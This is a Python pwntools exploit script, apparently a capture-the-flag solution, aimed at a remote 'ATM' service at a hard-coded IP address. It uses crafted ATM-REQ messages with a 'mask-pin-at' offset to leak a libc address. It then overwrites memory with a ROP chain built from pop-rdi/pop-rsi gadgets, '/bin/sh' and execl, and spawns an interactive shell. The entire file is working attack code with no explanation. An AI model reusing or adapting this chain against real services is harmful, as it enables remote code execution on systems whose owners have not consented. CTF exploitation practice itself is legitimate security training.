from pwn import *

HOST, PORT = "46.101.173.184", "1337" # Solved after CTF ended
# HOST, PORT = "172.17.0.2", 31338

menu = lambda: r.recvuntil("PIN: ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def save(payload, size):
	ii(1)
	ii(size)
	r.send(payload.ljust(size, '\x00'))

def show():
	ii(3)
	menu()
	data=r.recvline()
	print data
	return int(data, 16)

def send():
	ii(2)

def _(ip, pin=None):
	return ''.join([
		"ATM-REQ/1.0\n",
		"atm-ip: " + ip + "\n",
		"" if pin is None else "mask-pin-at: " + str(pin)])

# pause()
r = remote(HOST, PORT)
context.log_level='info'
pause()
save(_('ey', 0x359e0+1), 0x30000)
try:
	save(_('a'), 0x30000)
except:
	r.close()
libc=show()<<8|0x7f<<40
l=ELF('/lib/x86_64-linux-gnu/libc.so.6')
l.address=libc
poprdi=next(l.search('\x5f\xc3',0))
poprsi=next(l.search('\x5e\xc3',0))
binsh=next(l.search('/bin/sh\x00'))
system=l.symbols['execl']
print hex(libc)
save(_('ey', 0x30000*3+0x2000+0x3d98), 0x30000)
save(_('0\x00'.ljust(0x50-0x18)+'*'*8+'a'*0x18+p64(poprsi)+p64(0)+p64(poprdi)+p64(binsh)+p64(system), 0x30000*4+0x3000+0x3d9c), 0x30000)
send()
r.interactive()
